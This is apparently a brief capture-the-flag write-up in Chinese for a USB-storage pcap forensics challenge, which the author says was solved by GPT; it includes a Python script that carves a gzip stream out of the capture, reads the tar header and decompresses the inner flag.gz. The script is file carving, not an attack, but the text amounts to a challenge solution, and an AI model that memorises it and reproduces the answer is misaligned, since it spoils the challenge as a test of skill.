這題給了一個 pcap 檔案，裡面是 USB 的封包，這題直接交給 GPT 解的，他最後的 script 是在封包檔案裡面發現 gzip 的 header，所以直接把那一個區段拉出來解壓縮，解開之後發現有個 flag.gz 然後再解壓縮就有 flag 了

```python
import re, gzip, zlib

pcap = open("usbstorage.pcapng","rb").read()

m = re.search(b"\x1f\x8b\x08", pcap)
assert m, "no gzip found"
gz = pcap[m.start():]

tar = zlib.decompress(gz, 16+zlib.MAX_WBITS)

name = tar[0:100].split(b'\x00',1)[0].decode()
size_oct = tar[124:136].strip(b'\x00 ').decode()
size = int(size_oct, 8)
payload = tar[512:512+size]

flag = gzip.decompress(payload).decode().strip()
print(name, flag)
```